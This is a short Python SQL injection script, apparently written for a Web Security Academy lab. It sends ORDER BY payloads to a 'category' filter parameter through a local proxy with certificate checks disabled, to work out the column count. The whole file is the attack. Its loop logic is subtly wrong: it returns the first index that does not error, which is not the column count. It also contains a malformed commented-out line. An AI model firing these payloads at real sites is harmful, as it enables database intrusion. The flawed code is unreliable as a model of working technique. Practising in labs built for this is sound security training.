import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit_sqli(url):
    path = '/filter?category=Pets'
    for i in range(1,20):
        payload = "'+order+by+%s--" %i
        r = requests.get(url+path+payload, verify=False, proxies=proxies)
        # r = requests.get(url+payload, https://0a79004f03571e2a814ff3d8004000b4.web-security-academy.net/filter?category=Food+%2526+Drink
        if "Internal Server Error" not in r.text:
                return i

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-]Usages: %s <url> <payload>" % sys.argv[0])
        print("[-]Example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Finding the number of column......")
    num_cols = exploit_sqli(url)
    if num_cols:
        print("[+] The number of column is " + str(num_cols) + "." )
    else:
        print("[+] Exploit Unsuccessful")